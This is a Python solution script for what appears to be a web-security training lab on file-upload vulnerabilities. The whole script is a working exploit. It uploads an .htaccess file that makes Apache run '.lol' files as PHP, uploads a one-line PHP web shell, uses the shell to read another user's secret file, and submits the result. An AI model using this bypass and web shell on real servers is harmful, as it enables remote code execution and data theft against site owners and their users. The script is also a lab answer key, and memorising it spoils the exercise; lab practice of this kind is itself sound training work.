import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession
from bs4 import BeautifulSoup

lab = LabSession()

lab.login("wiener", "peter")

page = lab.get("/my-account")
soup = BeautifulSoup(page.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

# step 1: upload .htaccess to make apache execute .lol files as php
htaccess = b'AddType application/x-httpd-php .lol'
lab.info("Uploading .htaccess to register .lol as PHP...")
resp = lab.post("/my-account/avatar", files={
    "avatar": (".htaccess", htaccess, "text/plain")
}, data={
    "user": "wiener",
    "csrf": csrf
})
lab.info(f".htaccess upload: {resp.status_code}")

# need a fresh csrf token for the second upload
page = lab.get("/my-account")
soup = BeautifulSoup(page.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

# step 2: upload the shell with our custom extension
shell = b'<?php system($_GET["cmd"]); ?>'
lab.info("Uploading shell.lol...")
resp = lab.post("/my-account/avatar", files={
    "avatar": ("shell.lol", shell, "text/plain")
}, data={
    "user": "wiener",
    "csrf": csrf
})
lab.info(f"Shell upload: {resp.status_code}")

# step 3: execute the shell
secret_resp = lab.get("/files/avatars/shell.lol?cmd=cat+/home/carlos/secret")
secret = secret_resp.text.strip()
lab.success(f"Secret: {secret}")

lab.post("/submitSolution", data={"answer": secret})
lab.check_solved()
